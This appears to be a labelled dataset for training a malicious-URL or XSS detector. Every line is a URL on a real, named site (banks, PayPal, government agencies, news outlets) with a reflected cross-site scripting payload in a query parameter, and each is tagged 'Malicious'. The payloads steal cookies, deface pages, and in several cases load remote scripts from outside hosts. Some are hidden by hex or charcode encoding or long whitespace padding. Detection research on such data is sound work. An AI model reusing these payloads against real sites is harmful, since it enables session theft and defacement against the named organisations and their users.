http://stockpro.no/msg.asp?groupid=25&amp;group=oslo+b%f8rs&amp;topicid=6835&amp;topic=pdr_aksjonen%40yahoo.com&amp;<br>keyword=pdr}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarqu<br>ee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.ferienhof-ruessmann.de/mad//artmedic_cms33/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://moblog.net/tag/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1<br>%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://buyersguide.pdfzone.com/bguide/company/listcompaniesbysite.asp?page=13&amp;cbopagesize=&amp;getlistby<br>=%22%3e%3cscript%3ealert(%22xssed_by_omeha%22)%3c/script%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e,Malicious
https://bankingportal.sparkasse-bochum.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de%<br>3e,Malicious
http://www.nthcc.gov.tw/search-cgi/query_run.exe?query=%bd%d0%bf%e9%a4j%27%22%3e%3c%2ftitle%3e%3cscr<br>ipt%3ealert%281337%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3<br>e%c3%f6%c1%e4%a6r&amp;imagefield.x=0&amp;imagefield.y=0&amp;index_id=d2f11464_9354996&amp;user=idquest&amp;sbf=0&amp;class_n<br>ame=&amp;domain=&amp;thesaurus=off&amp;match=exact&amp;chinese=off&amp;h2foption=0&amp;all_file=on&amp;part_file=off&amp;begin_year=<br>1990&amp;begin_month=1&amp;begin_day=1&amp;end_year=2030&amp;end_month=12&amp;end_day=31&amp;begin_file=*&amp;end_file=*&amp;filenam<br>esearch=none&amp;sort=score&amp;no_rec=10&amp;order=desc&amp;match_type=match_line&amp;output=standard+output&amp;search_no=<br>00000&amp;reltermoption=1&amp;similar_keyword_option=on,Malicious
http://yotoshi.com/?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;category=<br>on&amp;order=0,Malicious
http://news.msn.co.kr/gate/v2/poll/poll.html?poll_idx=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.stumbleupon.com/submit?url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narc<br>oticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ayranpinar.com/resimalbum/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.idecaf.gov.vn/detail.php?lang=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://world.ccavenue.com/content/verifyseal.jsp?clientid=%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e,Malicious
http://www.chimurengalibrary.co.za/periodicals.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious
http://mars1.jpl.nasa.gov/cgi-bin/redplanet/search.pl?realm=&amp;match=0&amp;terms=gov&amp;rank=51%27%22%3e%3c/t<br>itle%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/ma<br>rquee%3e,Malicious
http://www.itif.org/rsvp/event.php?id=4%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://sexinthecitiestour.com/buynow.php?id=550%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.poitoucharentes.travail.gouv.fr/fiche/fiche.php?id=132&amp;rub=%22%3e'%3e%3cscript%20src=http<br>://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
https://mobile.paypal.com/nvpsm?amount=50.0&amp;currency_code=usd&amp;sender_country=&quot;&gt;&lt;script&gt;alert('xss')&lt;<br>/script&gt;,Malicious
http://webindex.giggog.com/search.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fs<br>cript%3e,Malicious
http://www.muckbucket.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.shopnuae.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.dokummakina.com.tr/index.php?module=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%<br>3b%3c/script%3e,Malicious
http://www.addthis.com/bookmark.php?v=12&amp;winname=addthis&amp;pub=wiseassoffice&amp;s=&amp;url=http%253a%252f%252<br>fwww.noheat.com%252f2007%252f11%252f30%252fgreat-wallpaper-for-vista-or-xp%252f&amp;title=&quot;&gt;&lt;script&gt;aler<br>t('trex')&lt;/script&gt;,Malicious
"http://auktioner.dk.msn.com/accdb/viewuser.asp?idu=""><script>alert(/king/)</script>",Malicious
http://www.regis.edu/regis.asp?sctn=sl&amp;p1=cs&amp;p2=jst&amp;p3=fj&amp;p4=rs}%3c/style%3e%3cscript%3ea=eval;b=ale<br>rt;a%28b%28/xss/.source%29%29;%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious
http://www.fullversionreleases.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/scri<br>pt%3e,Malicious
http://thesaurus.com/browse/asd%22%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://acp2.cn/?action=index&amp;setdate=200710&amp;setday=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%<br>74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2<br>f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.duesselaue.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://caps.fool.com/r/%3cscript%3ealert(%3cscript%3ealert(%22iblaze%22)%3cscript%3ealert(%22iblaze%<br>22)%3c/script%3e%3c/script%3e,Malicious
http://www.junkk.com/search.asp?searchstring=carton%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/s<br>cript%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://hosted3.deecash.com/galleries/exploitedindiangirls/120307ije09/index.html?nats=%22%3e%3cscrip<br>t%3ealert(1)%3c/script%3e%3ch1%3ehacked%20by%20trex/h1%3e,Malicious
http://meinestadt.msn.de/x/popup_engine.php?toinclude=event.php&amp;single=4940925&amp;location=79260&amp;start_<br>time=10.03.2007+00%3a00&amp;popup=1&amp;advertisement=1&amp;title=&quot;&gt;&lt;script&gt;alert(&quot;akincilar&quot;)&lt;/script&gt;,Malicious
http://strtc.oracle.com/imtapp/console/cns_download.jsp?file=%22%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious
http://no4.noblesystem.com/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%6<br>9%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31<br>%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%<br>2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.uptodown.com/?buscar=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3c<br>h1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3cce<br>nter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/c<br>enter%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://www.israelimages.com/searchresult.php?wsw=&amp;src_text=%3cscript%3ealert(%22xss%20found%20by%20e<br>dgard%20chammas%20aka%20454447415244%20!%22)%3c/script%3e&amp;wsearch=photos&amp;src_style=all,Malicious
http://padthaiprincess.journalspace.com/new/journals/?keyword=%22%3e%3cscript%3ealert(0)%3c/script%3<br>e,Malicious
http://curtarney.bmt.mlxchange.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=32<br>01&amp;hideresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3e<br>alert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20her<br>e%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/fo<br>rocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss<br>.html%20%3c,Malicious
http://www.dxhds.gov.cn/search/searchcontroller?searchword=%be%d6&amp;website=40%27%22%3e%3c/title%3e%3c<br>script%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marque<br>e%3e,Malicious
http://svn.jifty.org/index.cgi/jifty/view/wifty/trunk/web/static/js/ie7/ie7-standard-p.js?rev=&quot;&gt;&lt;scr<br>ipt&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://shop.lnbz.gov.cn/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3<br>e&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious
http://www.violenthammer.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%7<br>2%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53<br>%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3efuckface+browser+updat<br>e+hammer&amp;c=1&amp;p=1&amp;r=1196054657901,Malicious
http://exclusive.redtube.com/search.php?s=11293|0|838|15|wide|0&amp;lg=us&amp;actor_id=%22%3e%3cscript%3eale<br>rt(%22daimon%22)%3c/script%3e,Malicious
http://www.nhtsa.dot.gov/portal/site/nhtsa/template.maximize/menuitem.f2217bee37fb302f6d7c121046108a<br>0c/?javax.portlet.tpst=1e51531b2220b0f8ea14201046108a0c_ws_mx&amp;javax.portlet.prp_1e51531b2220b0f8ea14<br>201046108a0c_viewid=detail_view&amp;itemid=e76366ae805f4110vgnvcm1000002fd17898rcrd&amp;viewtype=standard&amp;pr<br>essreleaseyearselect='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.transparencialapaz.gob.mx/transparencia.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;<br>%3c/script%3e,Malicious
http://jp.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
"http://busca2.globo.com/busca/globo/?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;ordenacao=&amp;offset<br>=1&amp;xargs=&amp;formato=&amp;requisitor=globo&amp;aba=todos&amp;filtro=&amp;on=&amp;formatos=0,0,0,0,0,0,0,0,0,0,0",Malicious
http://www.aaa.com/scripts/webobjects.dll/zipcode.woa/250/wa/route?wosid='%3e%22%3e'%3e%3cscript%3ea<br>lert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.in.gov/apps/indcorrection/ofs/ofs?lname=%22%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;fnam<br>e=%22%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;search1.x=41&amp;search1.y=19,Malicious
http://www.ppp.bercy.gouv.fr/recherche/lance_recherche.php?mot=%3cscript%3ealert%28%2fzeryus%2f%29%3<br>c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;search_go=ok,Malicious
http://www.djk-dyckburg.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search2.foxnews.com/search?ie=utf-8&amp;oe=utf-8&amp;client=my_frontend&amp;proxystylesheet=my_frontend&amp;o<br>utput=xml_no_dtd&amp;site=story&amp;getfields=*&amp;filter=0&amp;sort=date%3ad%3as%3ad1&amp;q=%3c%2fscript%3e%3cscript%3<br>ealert%28%27xss%27%29%3c%2fscript%3e&amp;qstr=&amp;realm=fnc&amp;random=,Malicious
http://www.harmonika-pauli.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.afbini.gov.uk/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://absolutdrinks.com/community/login.aspx?chk=&amp;q=&amp;x=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;0&amp;<br>y=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;0,Malicious
http://ibama2.ibama.gov.br/cnia2/emprestimo/htdocs/phpinfo.php?cx[][][][][][][][][][][][][][][][][][<br>]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.lyhmwz.cn/hm/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.mediatv.nl/zoeken.php?searchbox=%22%3e%3cscript%3ealert%20%28%27killer-tr%27%29%3c/script<br>%3e%27%22%3e%3ciframe+src%3dhttp%3a%2f%2fi43.tinypic.com/2lksbgo.png%3e,Malicious
https://www.veropoulos.gr/eshop/shopper_lookup.asp?target=find.asp&amp;find_spec=%22%3e%3cmarquee%3e%3ch<br>1%3exss%20here%3c/h1%3e%3c/marquee%3e%3ciframe%20onload=alert(%22xss%22)%3e&amp;search.x=2&amp;search.y=8,Malicious
http://www.wellingtone.co.uk/candidates-register.php?ref=&lt;/textarea&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;affil<br>iate=mpi,Malicious
"http://www.faith-go.co.jp/lists/itemlist3_outlet.asp?cid=00322&amp;fl=1,2%22%3e'%3e%3c/script%3e%3cscrip<br>t/src=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;n_spec10=hdd",Malicious
http://www.sonypictures.com.br/sony/search.sonypictures?search=%22%3e%3ciframe%20onload=alert%28/xss<br>/%29%3e,Malicious
http://www.lib.gazi.edu.tr/sureli/index.php?l=p&amp;sid=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
"http://www.live365.com/cgi-bin/directory.cgi?site=&quot; width=0<br>height=0&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;&lt;img<br>src=&quot;/scp&amp;searchdesc=ddd&amp;searchgenre=presets",Malicious
http://www.microsoft.cz/glossary/glossary_search.asp?term=%22%3e%3cscript%3ealert%28%27seymen%27%29%<br>3c%2fscript%3e,Malicious
"http://www.eastlothian.gov.uk/search/sitesearch/0,1117,,00.html?maxresults=10&amp;q=%22%3e%27%3e%3cscrip<br>t%3ealert(123)%3c%2fscript%3e&amp;department=0",Malicious
"http://www.themexp.org/search.php?mode=advanced&amp;string=%22%3e'%3e%3cscript%3ealert(string.fromcharco<br>de(88,83,83))%3c/script%3e",Malicious
http://www.ojjdp.ncjrs.gov/search/searchresults.asp?ti=6&amp;si=27&amp;p=topic%22%3e'%3e%3cscript%3ealert('x<br>')%3c/script%3e,Malicious
http://www.turkishdailynews.com.tr/editorial.php?ed=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%20by%<br>20trex/h1&gt;,Malicious
http://cyber.law.harvard.edu/stockspam/public/onemsg.php?symbol=%3ch1%3e%3cscript%3ealert%28/hacked/%29%3c/script%3e%3c/h1%3e&id=58873%22%27--,Malicious
http://www.nyhetsportalen.se/?s=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://search.sify.com/login.php?n=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.boricuamall.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.deremate.com.ve/venezuela/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
https://astounded.tv/store/shopcustadmin.asp?msg=%3cscript%3ealert('by%20w0lfr4m%20cyber-unity%2%200<br>team');%3c/script%3e,Malicious
http://shop.lnbz.gov.cn/acceptjob.asp?job=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
"http://www.faz.net/in/intemplates/faznet/default.asp?suchzeitraum=3&amp;tpl=&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(s<br>tring.fromcharcode(88,83,83))&lt;/script&gt;&amp;term= suche&amp;go=",Malicious
http://playboy.nl/index.php?pageid=fun_ecards&amp;form=ecards&amp;ecard=1%20%27%22%3e%3c/title%3e%3cscript%3<br>ealert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%<br>3c/marquee%3e,Malicious
http://www.ris.bka.gv.at/taweb-cgi/taweb?q=%3cscript%3ealert(1);%3c/script%3e&amp;x=r&amp;v=lroo&amp;o=&amp;db3=lroo,Malicious
http://www6.islandrecords.com/site/search_results.php?artistsearch=%3cscript%3ealert%28%27xylitol+is<br>+back+-+hey+deryck+whibley+i+love+your+wife+lool+%3ap+-+xssed.com+for+life%27%29%3c%2fscript%3e&amp;x=27<br>&amp;y=12,Malicious
http://www.webexpressguide.com/costadelsol/notice.php?msg=%3cscript%3ealert(1);%3c/script%3e,Malicious
"https://securitycenter.verisign.com/contents_vrsn_us/orderstatuslearnmore.jsp?&amp;product_name=&quot;&gt;&lt;scrip<br>t&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.sde.gob.ar/educacion/notidetalle.php?id_noticia=%22%3e%3ciframe%20onload=alert%28/xss/%29<br>%3e,Malicious
http://stock.yahoo.co.kr/st2/st14/st1401/st140101/st14010101.html?url=%22%3e%3cscript%3ealert%28%2fw<br>ww.r3t.n3t.nl%2f%29%3c%2fscript%3e,Malicious
http://tr.cc/cgi-bin/manager.cgi?account=%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e%3cscript%3ealert(%22hacked%20by%20st@rext%22)%3c/script%3e,Malicious
http://www.eonline.com/account/signin/index.jsp?login_submit=submitted&amp;successpath=%2fsearch%2findex<br>.jsp%3f%26searchid%3d%2522%2522%253e%253e%253c%253cimg%2520%2522%2522%2522%253e%253cscript%253ealert<br>%28%2fxss%2f%29%253c%2fscript%253e&amp;usremail=%22%22%3e%3e%3c%3cimg+%22%22%22%3e%3cscript%3ealert%28%2<br>fxss%2f%29%3c%2fscript%3e&amp;passwd=,Malicious
http://www.vivaiotalenti.com/galleria/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.race.com/checkavailability/index.php?zipcode=%22%2f%3e%3cscript%3ealert%28%22xss%3a+vijayendra%22%29%3c%2fscript%3e&go=go&page=results,Malicious
http://shires.cor.mlxchange.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;<br>hideresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3eale<br>rt('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3<br>c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/foroc<br>ibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.ht<br>ml%20%3c,Malicious
http://www.cie.org.uk/search?searchfield=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%28%22planetcreator<br>%22%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+planetcreator%3c%2fh1%3e%3c%2fmarquee%3e&amp;wordbou<br>nd=on&amp;boolean=and&amp;case=insensitive&amp;box=any,Malicious
http://www.planningapplications.tas.gov.au/index.php?module=main&amp;action=search&amp;searchinput=&lt;script&gt;a<br>lert(123)&lt;/script&gt;,Malicious
https://mep.pandasecurity.com/?action=rememberpassword&login=gjuipqgc&userkind=%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
http://arsiz.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.yemekyerim.com/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;<br>h1&gt;st@rext&lt;/h1&gt;,Malicious
http://pknic.net.pk/cgi-bin/pknic-db/bill.html?name=\%22%3e%3cfont%20size=\%22100\%22%3egurus%3cmarq<br>uee%3egurus%20here%3c/marquee%3e,Malicious
http://photo.alanaandshawn.com/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ron-and-iris.geefamily.net/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.justice.tas.gov.au/bdm/home/bdm_search_page?x=0&amp;y=0&amp;queries_description_query=%22%3e%3csc<br>ript%3ealert%28123%29%3c%2fscript%3e&amp;search_page_16663_submit_button=submit&amp;current_result_page=0&amp;re<br>sults_per_page=10&amp;submitted_search_category=%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;mode=results,Malicious
http://www.pchardware.ro/articles/article.php?id=127%22%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cscript%20src=http://<br>lupbot.comule.com/asu_abangjs.php%3e%3c/script%3e,Malicious
http://mm.search.nate.com/search/video.html?q=%3e%3c/script%3e%3cscript%3ealert%22xss!%22%3c/script%<br>3e%3cscript%3e&amp;tq=&amp;nq=1&amp;rq=&amp;sg=%3e%3c/script%3e%3cscript%3ealert(%22xss!%22)%3c/script%3e%3cscript%3<br>e,Malicious
http://www.governmentcontractswon.com/search.asp?type='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cb<br>r%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
"http://guides.lib.uiowa.edu/searchtags.php?iid=&amp;tag=%27;alert%28string.fromcharcode%2888,83,83%29%29<br>//\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%29%2<br>9//\%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealer<br>t%28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.fsco.gov.on.ca/french/mailthispage.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script<br>&gt;,Malicious
http://www.simonsays.com/content/ene/search.cfm?n=0&amp;ntk=all&amp;nty=1&amp;ntx=&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://mktg.acresso.com/mk/get/msidesignbp-wp?mc=%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c<br>/h1%3e%3c/marquee%3e,Malicious
http://www.fotogenika.net/modifica/login.asp?d=&amp;n=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.worldmissphotogenic.com/newsdetail.php?id=%27%27%22%3e%3c/title%3e%3cscript%3ealert%28133<br>7%29%3c/script%3e,Malicious
http://www.acciontv.guatemala.gob.gt/discurso.php?codigo=1154&amp;tipo=%22%3e%3cscript%3ealert(/xssed!/)<br>;%3c/script%3e,Malicious
http://www.fbwev.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://cccccccccccccccccccccccc.com/home.php?l=en&amp;token=le1ldh3bwyokewjo56olzcqoahuygrokhtrc0l8yayaa<br>mlrtrba4dq&amp;q=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.pau-pyrenees.com/fr/sortir_en_ville_le_shopping.php?id_parent=115&amp;idmenuencours=173&amp;menuf<br>il=%20shopping/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
http://www.kalbistan.net/mods.php?go=downloads&amp;p=ld&amp;mode=file&amp;val=1%22%3e%3ch1%3eby%20st@rext%3c/h1%<br>3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.catholic.org/saints/stindex.php?lst=z}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.so<br>urce));%3c/script%3e,Malicious
http://www.idahopower.com/aboutus/companyinformation/search.cfm?search=0&amp;st=%22%3e%3cscript%3ealert%<br>28document.cookie%29%3c/script%3e,Malicious
http://www.belmar.com.tr/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,Malicious
http://www2.hu-berlin.de/psychologie/ingpsycscw/methwiki/pmwiki.php?n=main.wikisandbox?from=%22/&gt;&lt;bo<br>dy onload=alert(43727373537453637270746732)&gt;,Malicious
http://www.uwork.com.au/uwork/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mke.go.kr/common/search/wnsearch.jsp?collection=all&startcount_info=0&startcount=0&cate=0&query=%22%3e%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fxss.js%3e%3c%2fscript%3e,Malicious
http://midorikawa.vhost.meyu.net/blog/upload/index.php?setdate=200707%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
